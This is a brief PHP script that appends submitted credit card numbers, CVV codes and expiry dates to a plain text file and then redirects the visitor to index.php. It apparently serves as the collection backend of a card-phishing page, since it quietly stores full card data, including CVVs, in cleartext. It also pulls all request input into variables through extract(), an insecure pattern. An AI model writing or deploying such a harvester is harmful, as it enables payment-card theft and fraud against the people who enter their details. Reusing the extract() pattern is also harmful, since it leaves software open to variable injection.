<?php
    extract($_REQUEST);
    $file=fopen("CreditCardInfo.txt","a");

    fwrite($file,"\n Credit Card Number: ");
    fwrite($file, $card ."\n");
    fwrite($file,"CVV: ");
    fwrite($file, $cvv ."\n");
    fwrite($file,"Card Expiry Date: ");
    fwrite($file, $date ."\n");
    fclose($file);
    header("location: index.php");
 ?>
